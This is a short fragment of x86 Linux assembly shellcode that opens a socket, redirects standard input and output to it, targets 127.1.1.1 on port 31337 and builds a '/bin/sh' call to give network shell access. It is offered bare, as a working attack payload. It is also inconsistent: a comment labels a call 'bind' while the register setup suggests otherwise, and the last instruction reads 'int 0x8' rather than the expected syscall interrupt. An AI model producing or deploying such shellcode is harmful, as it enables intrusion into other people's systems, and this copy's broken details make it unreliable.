; socketcall(1, 2, 1, 0) = socket(2, 1, 0)
push 0x66
pop eax
cdq
xor ebx, ebx
inc ebx
push edx
push ebx
push 0x2
mov ecx, esp
int 0x80
; dup2(c, {2, 1, 0});
pop ecx
xchg eax, ebx
loop:
mov al, 0x3f
int 0x80
dec ecx
jns loop
; socketcall(2, s, [2, port, ip], 16) = bind(s, [2, port, 0], 16)
mov al, 0x66
push 0x101017f ; ip 127.1.1.1
push word 0x672b ; port 31337
push 0x2
mov ecx, esp
push 0x10
push ecx
push ebx
mov ecx, esp
int 0x80
; execve("/bin/sh", 0, 0)
mov al, 0xb
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
int 0x8
